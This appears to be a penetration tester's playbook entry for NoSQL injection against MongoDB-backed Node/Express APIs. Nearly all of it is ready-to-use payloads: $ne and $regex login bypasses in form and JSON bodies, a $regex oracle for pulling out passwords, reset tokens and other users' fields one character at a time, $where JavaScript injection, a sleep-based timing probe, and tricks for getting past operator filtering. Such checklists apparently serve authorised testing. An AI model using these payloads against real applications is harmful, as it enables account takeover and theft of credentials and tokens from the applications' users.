# NoSQL injection

## Before I start
- [ ] The application looks like MongoDB behind it: Node and Express, a JSON API, /api/ routes: :Pb api

## Login bypass
In a form body, then as JSON:
username=<Username>&password[$ne]=x
username=<Username>&password[$regex]=.*
{"username":"<Username>","password":{"$ne":null}}
- [ ] Operators filtered in a form body: sent again as application/json, since most applications parse both and filter one
- [ ] $gt with an empty value as well

## Extract a value, one character at a time
username=<Username>&password[$regex]=^a
- [ ] A login that succeeds or fails by the pattern is an oracle: a short Python script with requests tries each next character
- [ ] Passwords, reset tokens and other users' fields come out this way

## $where, a JavaScript context
' || 1==1//
' && this.password.match(/^a/)//
- [ ] Rare on a modern stack: operators first, JavaScript second

## If it fails
- [ ] 400 on operators: the query builder cleans them, so nested JSON and repeated parameters
- [ ] No difference to see: a delay inside $where, ' && sleep(5000)//, where it evaluates JavaScript

## Next
- [ ] A token or password: the account, then :Pb api
- [ ] MongoDB reachable on the host itself: :Pb mongodb
